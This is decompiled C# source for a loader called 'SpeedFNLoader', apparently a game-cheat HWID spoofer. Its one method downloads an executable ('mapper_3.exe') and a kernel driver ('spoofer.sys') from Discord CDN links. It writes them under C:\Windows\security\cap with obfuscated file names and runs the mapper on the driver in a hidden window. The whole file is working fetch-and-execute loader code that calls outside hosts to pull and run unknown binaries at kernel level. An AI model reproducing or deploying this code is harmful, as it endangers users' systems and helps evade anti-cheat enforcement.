using System;
using System.Diagnostics;
using System.Net;
using System.Threading;

namespace SpeedFNLoader
{
	// Token: 0x02000003 RID: 3
	internal class Spoofer
	{
		// Token: 0x06000002 RID: 2 RVA: 0x00002068 File Offset: 0x00000268
		public static void Load()
		{
			WebClient webClient = new WebClient();
			string fileName = "C:\\Windows\\security\\cap\\f45645g6g456g633g5q6q3g62gq456qg645.exe";
			string text = "C:\\Windows\\security\\cap\\t78zon3547noh83457hn8345.sys";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/734097285839061084/734105232358899732/mapper_3.exe", fileName);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/734097285839061084/734105210732937307/spoofer.sys", text);
			Process process = new Process();
			process.StartInfo.FileName = "cmd.exe";
			process.StartInfo.UseShellExecute = true;
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process process2 = Process.Start(fileName, text);
			Thread.Sleep(250);
			process2.Close();
		}
	}
}
